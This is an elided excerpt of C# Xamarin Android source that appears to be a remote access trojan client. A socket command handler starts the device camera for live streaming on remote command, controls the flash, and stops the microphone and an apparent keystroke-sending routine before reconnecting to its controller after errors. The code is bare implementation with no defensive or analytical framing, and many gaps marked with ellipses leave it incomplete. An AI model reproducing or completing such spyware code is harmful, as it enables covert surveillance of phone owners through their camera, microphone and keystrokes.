    ...
    public class MainActivity : Activity
    {
        ...
        public async void infoAl(Socket sckInf)
        {
            try
            {
                ...
                int thisRead = 0;
                int blockSize = 2048;
                byte[] dataByte = new byte[blockSize]; //sb.ToString().IndexOf("[0x09]")
                while (true)
                {
                    ...
                    while (sb.ToString().Trim().Replace("[0x09]KNT[VERI][0x09]<EOF>", "").Contains("<EOF>"))
                    {
            ...
            catch (Exception) { Prev.global_cam.StopCamera(); key_gonder = false; micStop(); Baglanti_Kur(); }
        }
        public async void soketimizeGonder(string tag, string mesaj)
        {
            try
            {
                ...
                //await Soketimiz.SendAsync(cmd, SocketFlags.None);
                    ...
                    try
                    {
                        switch (ayirici[0])
                        {
                            ...
                            case "LIVESTREAM":
                                ...
                                Prev.global_cam.StartCamera(int.Parse(kamera), flashmode, cozunurluk);
                                break;
                            case "LIVEFLASH":
                                ...
                                else { pr.FlashMode = Android.Hardware.Camera.Parameters.FlashModeOff; }
